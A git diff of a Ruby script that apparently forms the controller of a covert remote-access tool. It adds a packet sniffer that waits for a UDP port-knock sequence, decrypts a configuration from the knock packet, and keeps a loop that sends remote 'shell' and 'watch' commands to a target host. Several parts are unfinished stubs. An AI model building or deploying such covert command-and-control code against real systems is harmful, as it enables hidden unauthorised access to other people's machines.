@@ -48,11 +48,60 @@ INPUT_REGEX = /^(shell|watch) .+$/
 ## Functions
 
 def listen_for_knock
+  puts "starting silent listen for knock\n>"
+  filter = "udp or tcp"
+  begin
+    cap = PacketFu::Capture.new(:iface => $cfg_iface,
+        :start => true,
+        :promic => true,
+        :filter => filter)
+      k1, k2, k3 = false, false, false
+      k4, k5, k6 = false, false, false
+      config = nil
+      cap.stream.each do |p|
+        pkt =  PacketFu::Packet.parse(p)
+        if PacketFu::UDPPacket.can_parse?(p)
+          #UDP
+          puts "udp: #{pkt.udp_dst}"
+          if pkt.udp_dst == 44444
+            k1 = true
+          elsif pkt.udp_dst == 55555
+            k2 = true
+            config = decrypt(pkt.payload)
+          elsif pkt.udp_dst == 44544
+            k3 = true
+          end
+        elsif PacketFu::TCPPacket.can_parse?(p)
+          #TCP
+          #puts "tcp: #{pkt.tcp_dst}"
+        else
+          #not implemented
+        end
+        if k1 && k2 && k3
+          puts "knock recv"
+          k1, k2, k3 = false, false, false
+          start_receiving_server(config)
+        elsif k4 && k5 && k6
+          puts "knock recv"
+          k4, k5, k6 = false, false, false
+          start_receiving_server(config)
+        else
+          #not implemented
+        end
+      end
+    rescue Exception => e
+      puts "error in pkt capture"
+    end
+
+    puts "bottom"
+end
+
+def timer(port)
   
 end
 
-def start_receiving_server
-  
+def start_receiving_server(config)
+  puts config
 end
 
 def start_command_loop
@@ -60,18 +109,14 @@ def start_command_loop
   puts "+ shell (cmd)"
   puts "+ watch (dir|file) (path)"
   puts "+ \"ctrl + c\" to exit"
-  begin
-    loop {
-      input = Readline.readline('> ', true)  
-      if input.match(INPUT_REGEX)
-        send_pkt_server_async(input.strip)
-      else
-        puts "Incorrect command format"
-      end
-    }
-  rescue Interrupt
-    puts "ctrl+c received"
-  end
+  loop {
+    input = Readline.readline('> ', true)  
+    if input.match(INPUT_REGEX)
+      send_pkt_server_async(input.strip)
+    else
+      puts "Incorrect command format"
+    end
+  }
 end
 
 def send_pkt_server_async(command)
@@ -112,4 +157,12 @@ end
 load_config_file
 validate_target_ip
 puts "+ Welcome to \"not a hacking\" program"
-start_command_loop
+begin
+  listening_thread = Thread.new { listen_for_knock }
+  start_command_loop
+  listening_thread.join
+rescue Interrupt
+  puts "ctrl+c received"
+  Thread.kill(listening_thread)
+  exit 0
+end
